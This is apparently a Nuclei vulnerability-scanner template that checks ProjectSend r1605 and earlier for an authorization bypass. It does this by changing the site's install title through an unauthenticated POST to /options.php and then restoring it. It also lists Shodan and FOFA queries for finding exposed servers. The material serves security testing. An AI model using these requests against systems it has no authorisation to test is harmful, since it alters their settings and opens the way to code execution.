flow: http(1) && http(2) && http(3) && http(4) && http(5)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    regex:
    - name="csrf_token" value="([0-9a-z]+)"
    type: regex
  - group: 1
    internal: true
    name: title
    regex:
    - <title>Log in &raquo; ([0-9a-zA-Z]+)<\/title>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "projectsend")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'POST /options.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_token={{csrf}}&section=general&this_install_title={{string}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{string}}")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'POST /options.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_token={{csrf}}&section=general&this_install_title={{title}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{title}}")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: projectsend-auth-bypass
info:
  author: DhiyaneshDK
  description: 'An improper authorization check was identified within ProjectSend
    version r1605 that allows an attacker to perform sensitive actions such as enabling
    user registration and auto validation, or adding new entries in the whitelist
    of allowed extensions for uploaded files. Ultimately, this allows to execute arbitrary
    PHP code on the server hosting the application.

    '
  metadata:
    fofa-query: body="ProjectSend"
    max-request: 1
    shodan-query: html:"ProjectSend"
    verified: true
  name: ProjectSend <= r1605 - Improper Authorization
  reference:
  - https://www.projectsend.org/
  - https://www.synacktiv.com/sites/default/files/2024-07/synacktiv-projectsend-multiple-vulnerabilities.pdf
  severity: high
  tags: misconfig,projectsend,auth-bypass,intrusive
variables:
  string: '{{randstr}}'
